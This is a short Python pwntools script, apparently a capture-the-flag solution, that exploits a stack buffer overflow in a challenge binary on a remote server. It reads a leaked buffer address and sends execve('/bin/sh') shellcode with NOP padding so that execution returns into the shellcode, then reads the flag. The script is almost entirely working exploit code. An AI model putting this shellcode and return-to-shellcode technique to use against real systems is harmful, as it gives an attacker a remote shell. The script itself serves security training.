#!/usr/bin/env python3
from pwn import *

context.update(arch='x86')
exe = './chall'


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# p = start()
p = remote("gc1.eng.run", 31656)

#Return to shellcode
p.recv()
p.sendline(b"3")
p.recvuntil(b">")
bufadd = p.recvline().strip()
log.info(f"buf address: {bufadd}")

#place the shellcode in the buffer call it
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
p.recv()
p.sendline(shellcode + b"\x90"*(136-len(shellcode)) + p64(int(bufadd[2:], 16)))
p.sendline(b"cat flag.txt")
print(p.recvline())
p.interactive()

